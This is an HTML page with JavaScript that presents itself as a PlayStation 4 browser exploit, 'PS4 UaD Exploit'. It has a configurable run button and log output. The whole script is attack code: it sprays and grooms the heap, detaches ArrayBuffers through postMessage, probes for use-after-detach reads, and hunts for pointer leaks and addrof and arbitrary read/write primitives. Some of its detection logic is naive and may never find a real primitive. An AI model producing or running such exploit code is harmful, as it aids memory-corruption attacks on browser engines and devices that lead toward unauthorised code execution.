<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PS4 UaD Exploit - Type Confusion & Arbitrary R/W</title>
</head>
<body>
  <h2>PS4 UaD Exploit - Type Confusion & Arbitrary R/W Primitives</h2>

  <button id="run">RUN EXPLOIT</button>
  <button id="stop">STOP</button>
  <button id="reset">Reset Log</button>
  <br><br>

  <div>
    <strong>Configuration:</strong><br>
    Attempts: <input id="N" type="number" value="50" min="1" step="1"><br>
    Timeout (ms): <input id="to" type="number" value="200" min="50" step="50"><br>
    Delay (ms): <input id="delay" type="number" value="5" min="0" step="5"><br>
    Spray Size: <input id="spray" type="number" value="200" min="50" step="50"><br>
    Buffer Size: <input id="bufsize" type="number" value="0x10000" min="0x1000" step="0x1000"><br>
  </div>
  <br>

  <div>
    <strong>Status:</strong> <span id="status">Idle</span><br>
    <strong>Leaks Found:</strong> <span id="leaks">0</span><br>
    <strong>Overlaps Detected:</strong> <span id="overlaps">0</span><br>
  </div>
  <br>

  <pre id="log"></pre>

<script>
(() => {
  "use strict";

  const $log = document.getElementById("log");
  const $status = document.getElementById("status");
  const $leaks = document.getElementById("leaks");
  const $overlaps = document.getElementById("overlaps");
  const $N = document.getElementById("N");
  const $to = document.getElementById("to");
  const $delay = document.getElementById("delay");
  const $spray = document.getElementById("spray");
  const $bufsize = document.getElementById("bufsize");

  let STOP = false;
  let leakCount = 0;
  let overlapCount = 0;

  // Possíveis primitivas globais
  let addrof_primitive = null;
  let read_primitive = null;
  let write_primitive = null;

  function ts(){ return Date.now(); }
  function logLine(s){ 
    $log.textContent += `[${ts()}] ${s}\n`; 
    $log.scrollTop = $log.scrollHeight;
  }
  function reset(){ 
    $log.textContent = ""; 
    logLine("Log reset.");
    leakCount = 0;
    overlapCount = 0;
    updateStatus("Idle");
  }
  function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
  function updateStatus(s){ $status.textContent = s; }

  async function withTimeout(p, ms){
    let t;
    const timeout = new Promise((_, rej) => t = setTimeout(() => rej(new Error("TIMEOUT")), ms));
    try { return await Promise.race([p, timeout]); }
    finally { clearTimeout(t); }
  }

  function j(x){
    try { return JSON.stringify(x); } catch(e){ return String(x); }
  }

  // Convert bytes to hex string
  function toHex(bytes, len = 8) {
    const hex = [];
    for (let i = 0; i < Math.min(len, bytes.length); i++) {
      hex.push(bytes[i].toString(16).padStart(2, '0'));
    }
    return hex.join(' ');
  }

  // Convert Float64 to hex for leak analysis
  function f64ToHex(f64val) {
    const buffer = new ArrayBuffer(8);
    const view = new DataView(buffer);
    view.setFloat64(0, f64val, true); // little-endian
    let hex = "";
    for (let i = 0; i < 8; i++) {
      hex += view.getUint8(i).toString(16).padStart(2, '0');
    }
    return "0x" + hex;
  }

  // Check if value looks like a pointer (heuristic)
  function looksLikePointer(f64val) {
    const hex = f64ToHex(f64val);
    // PS4 userland pointers typically start with 0x00007f or 0x000000
    // Check for non-zero high bits and reasonable range
    if (hex.includes('7f') || hex.includes('00000001')) {
      const num = parseInt(hex, 16);
      // Reasonable userland range
      if (num > 0x1000 && num < 0x800000000000) {
        return true;
      }
    }
    return false;
  }

  // Aggressive heap spray with multiple types
  function heapSpray(cfg) {
    const containers = {
      arrays: [],
      float64arrays: [],
      uint32arrays: [],
      dataviews: [],
      objects: []
    };

    const spraySize = cfg.spraySize || 200;
    const bufSize = cfg.bufSize || 0x10000;

    logLine(`[SPRAY] Creating ${spraySize} objects of various types, bufSize=0x${bufSize.toString(16)}`);

    for (let i = 0; i < spraySize; i++) {
      // ArrayBuffers
      const ab = new ArrayBuffer(bufSize);
      containers.arrays.push(ab);

      // Float64Arrays
      const f64 = new Float64Array(bufSize / 8);
      for (let j = 0; j < f64.length; j++) {
        f64[j] = i + j * 0.1;
      }
      containers.float64arrays.push(f64);

      // Uint32Arrays with patterns
      const u32 = new Uint32Array(bufSize / 4);
      for (let j = 0; j < u32.length; j++) {
        u32[j] = 0x41414141 + i;
      }
      containers.uint32arrays.push(u32);

      // DataViews
      const dv = new DataView(new ArrayBuffer(bufSize));
      containers.dataviews.push(dv);

      // JS Objects with properties
      const obj = {
        marker: 0xdeadbeef + i,
        ptr1: {},
        ptr2: {},
        data: new Array(100).fill(i)
      };
      containers.objects.push(obj);
    }

    logLine(`[SPRAY] Complete: ${spraySize * 5} objects allocated`);
    return containers;
  }

  // Create holes in heap
  function createHoles(containers, percentage = 0.5) {
    logLine(`[HOLES] Freeing ${percentage * 100}% of sprayed objects`);
    
    const freeIndices = [];
    for (let i = 0; i < containers.arrays.length; i++) {
      if (Math.random() < percentage) {
        freeIndices.push(i);
      }
    }

    // Free selected indices
    for (const idx of freeIndices) {
      containers.arrays[idx] = null;
      containers.float64arrays[idx] = null;
      containers.uint32arrays[idx] = null;
      containers.dataviews[idx] = null;
      containers.objects[idx] = null;
    }

    logLine(`[HOLES] Freed ${freeIndices.length} objects`);
    return freeIndices;
  }

  // Attempt to detect type confusion
  function detectTypeConfusion(u8, dv, f64view) {
    const results = {
      detected: false,
      u8_readable: false,
      dv_readable: false,
      f64_readable: false,
      leaks: []
    };

    // Try reading as Uint8Array
    try {
      const val = u8[0];
      results.u8_readable = true;
      results.u8_sample = toHex(u8, 16);
    } catch (e) {
      results.u8_error = e.name;
    }

    // Try reading as DataView
    try {
      const val = dv.getUint32(0, true);
      results.dv_readable = true;
      results.dv_value = "0x" + val.toString(16);
    } catch (e) {
      results.dv_error = e.name;
    }

    // Try reading as Float64Array (leak detection)
    try {
      for (let i = 0; i < Math.min(8, f64view.length); i++) {
        const f64val = f64view[i];
        if (looksLikePointer(f64val)) {
          const leak = f64ToHex(f64val);
          results.leaks.push({ index: i, value: leak });
          results.detected = true;
        }
      }
      results.f64_readable = true;
    } catch (e) {
      results.f64_error = e.name;
    }

    return results;
  }

  // Try to build addrof primitive
  function attemptAddrof(victimAB, u8, dv) {
    logLine("[ADDROF] Attempting to build addrof primitive...");
    
    // Strategy: overlap victim buffer with Float64Array
    // Then read JSObject as Float64
    const testObj = { marker: 0x13371337 };
    
    try {
      // If we can still read the detached buffer and it overlaps with
      // a Float64Array, we might be able to read object addresses
      const f64 = new Float64Array(8);
      
      // Fill with test object reference pattern
      for (let i = 0; i < f64.length; i++) {
        f64[i] = 1.0 + i;
      }

      // Try to detect if victim buffer overlaps with f64
      let overlap = false;
      for (let i = 0; i < Math.min(64, u8.length); i++) {
        try {
          const val = u8[i];
          // Check for Float64 pattern
          if (val === 0x3f && u8[i+1] === 0xf0) { // 1.0 in IEEE754
            overlap = true;
            logLine(`[ADDROF] Potential overlap detected at offset ${i}`);
            overlapCount++;
            $overlaps.textContent = overlapCount;
          }
        } catch (e) {
          break;
        }
      }

      return overlap;
    } catch (e) {
      logLine(`[ADDROF] Error: ${e.name}`);
      return false;
    }
  }

  // Try to build arbitrary read primitive
  function attemptArbitraryRead(victimAB, u8, dv, cfg) {
    logLine("[ARB_READ] Attempting arbitrary read primitive...");
    
    try {
      // Strategy: If we have type confusion between detached ArrayBuffer
      // and a TypedArray, we can try to corrupt the backing_store pointer
      
      // Create candidate arrays for overlap
      const candidates = [];
      for (let i = 0; i < 20; i++) {
        const ta = new Uint8Array(cfg.bufSize);
        // Fill with marker
        ta[0] = 0x42;
        ta[1] = 0x42;
        candidates.push(ta);
      }

      // Try to modify through victim buffer
      for (let offset = 0; offset < 128; offset += 8) {
        try {
          // Try to write a controlled value
          dv.setUint32(offset, 0xdeadbeef, true);
          
          // Check if any candidate was affected
          for (let i = 0; i < candidates.length; i++) {
            if (candidates[i][0] === 0xef && candidates[i][1] === 0xbe) {
              logLine(`[ARB_READ] Possible write primitive at offset ${offset}!`);
              return { success: true, offset, candidateIdx: i };
            }
          }
        } catch (e) {
          // Continue
        }
      }

      return { success: false };
    } catch (e) {
      logLine(`[ARB_READ] Error: ${e.name}`);
      return { success: false };
    }
  }

  // Main exploitation attempt
  async function runExploit(i, cfg, stats, samples, spray) {
    const ch = new MessageChannel();
    let got = undefined;

    ch.port2.onmessage = (ev) => { got = ev.data; };

    // Create victim buffer
    const victimAB = new ArrayBuffer(cfg.bufSize);
    const u8 = new Uint8Array(victimAB);
    const dv = new DataView(victimAB);
    
    // Fill with marker pattern
    for (let i = 0; i < Math.min(256, u8.length); i++) {
      u8[i] = 0xAA;
    }

    // Detach via postMessage
    let threw = false;
    try { 
      ch.port1.postMessage(victimAB, [victimAB]); 
    } catch(e) { 
      threw = true; 
      stats.throw++;
    }

    if (threw) return;

    // Wait for delivery
    try { 
      await withTimeout(Promise.resolve().then(() => sleep(0)), cfg.timeoutMs); 
    } catch(_) { 
      stats.timeout++; 
      return; 
    }

    const senderLen = victimAB.byteLength;
    
    // Check for detach
    if (senderLen !== 0) {
      stats.not_detached++;
      return;
    }

    stats.detached++;

    // Try to read from detached buffer (UaD window)
    let canRead = false;
    try {
      const test = u8[0];
      canRead = true;
      stats.uad_window++;
    } catch (e) {
      stats.no_uad_window++;
      return;
    }

    if (!canRead) return;

    logLine(`[ATTEMPT ${i}] UaD window confirmed, attempting exploitation...`);

    // Create Float64 view for leak detection
    let f64view;
    try {
      f64view = new Float64Array(victimAB);
    } catch (e) {
      // Might fail if detached, create from raw buffer
      const rawBuf = new ArrayBuffer(cfg.bufSize);
      f64view = new Float64Array(rawBuf);
    }

    // Detect type confusion
    const confusion = detectTypeConfusion(u8, dv, f64view);
    
    if (confusion.leaks.length > 0) {
      logLine(`[LEAK] Found ${confusion.leaks.length} potential pointer leaks!`);
      for (const leak of confusion.leaks) {
        logLine(`  [${leak.index}] ${leak.value}`);
        leakCount++;
        $leaks.textContent = leakCount;
      }
      stats.leaks += confusion.leaks.length;
      samples.leaks.push({ i, leaks: confusion.leaks });
    }

    if (confusion.u8_readable) {
      logLine(`[BYTES] ${confusion.u8_sample}`);
    }

    // Attempt primitives
    if (confusion.detected || confusion.u8_readable) {
      // Try addrof
      const addrof = attemptAddrof(victimAB, u8, dv);
      if (addrof) {
        stats.addrof_attempts++;
      }

      // Try arbitrary read
      const arbread = attemptArbitraryRead(victimAB, u8, dv, cfg);
      if (arbread.success) {
        stats.arbread_success++;
        logLine(`[SUCCESS] Arbitrary read primitive candidate found!`);
        samples.arbread.push({ i, ...arbread });
      }
    }

    // Memory pressure for better overlap
    await sleep(cfg.delayMs);
  }

  async function runAuto() {
    STOP = false;
    updateStatus("Running...");

    const cfg = {
      N: Math.max(1, parseInt($N.value || "50", 10)),
      timeoutMs: Math.max(50, parseInt($to.value || "200", 10)),
      delayMs: Math.max(0, parseInt($delay.value || "5", 10)),
      spraySize: Math.max(50, parseInt($spray.value || "200", 10)),
      bufSize: parseInt($bufsize.value || "0x10000", 16)
    };

    logLine(`[CONFIG] N=${cfg.N}, timeout=${cfg.timeoutMs}ms, delay=${cfg.delayMs}ms`);
    logLine(`[CONFIG] spraySize=${cfg.spraySize}, bufSize=0x${cfg.bufSize.toString(16)}`);

    const stats = {
      throw: 0,
      timeout: 0,
      not_detached: 0,
      detached: 0,
      uad_window: 0,
      no_uad_window: 0,
      leaks: 0,
      addrof_attempts: 0,
      arbread_success: 0
    };

    const samples = {
      leaks: [],
      arbread: []
    };

    // Phase 1: Heap spray
    logLine("\n=== PHASE 1: Heap Spray ===");
    const spray = heapSpray(cfg);
    await sleep(100);

    // Phase 2: Create holes
    logLine("\n=== PHASE 2: Heap Grooming ===");
    createHoles(spray, 0.4);
    await sleep(100);

    // Phase 3: Exploitation attempts
    logLine("\n=== PHASE 3: Exploitation Attempts ===");
    for (let i = 0; i < cfg.N; i++) {
      if (STOP) break;
      
      await runExploit(i, cfg, stats, samples, spray);

      if ((i + 1) % 10 === 0) {
        logLine(`Progress: ${i + 1}/${cfg.N}`);
      }

      if (cfg.delayMs > 0) await sleep(cfg.delayMs);
    }

    // Results
    logLine("\n=== RESULTS ===");
    logLine(`Stats: ${j(stats)}`);
    
    if (samples.leaks.length > 0) {
      logLine(`\nLeak samples (${samples.leaks.length}):`);
      samples.leaks.slice(0, 5).forEach(s => {
        logLine(`  Attempt ${s.i}: ${j(s.leaks)}`);
      });
    }

    if (samples.arbread.length > 0) {
      logLine(`\nArbitrary read candidates (${samples.arbread.length}):`);
      samples.arbread.forEach(s => {
        logLine(`  Attempt ${s.i}: offset=${s.offset}, candidate=${s.candidateIdx}`);
      });
    }

    if (stats.leaks > 0 || stats.arbread_success > 0) {
      logLine("\n[!!!] POTENTIAL EXPLOITATION VECTORS FOUND [!!!]");
    } else {
      logLine("\n[INFO] No clear exploitation primitives found in this run.");
      logLine("[INFO] Try increasing spray size or number of attempts.");
    }

    logLine("\nDONE.");
    updateStatus("Complete");
  }

  document.getElementById("run").onclick = () => {
    runAuto().catch(e => {
      logLine(`ERROR: ${e.name || String(e)}`);
      updateStatus("Error");
    });
  };
  
  document.getElementById("stop").onclick = () => { 
    STOP = true; 
    logLine("STOP requested."); 
    updateStatus("Stopped");
  };
  
  document.getElementById("reset").onclick = reset;

  reset();
})();
</script>
</body>
</html>
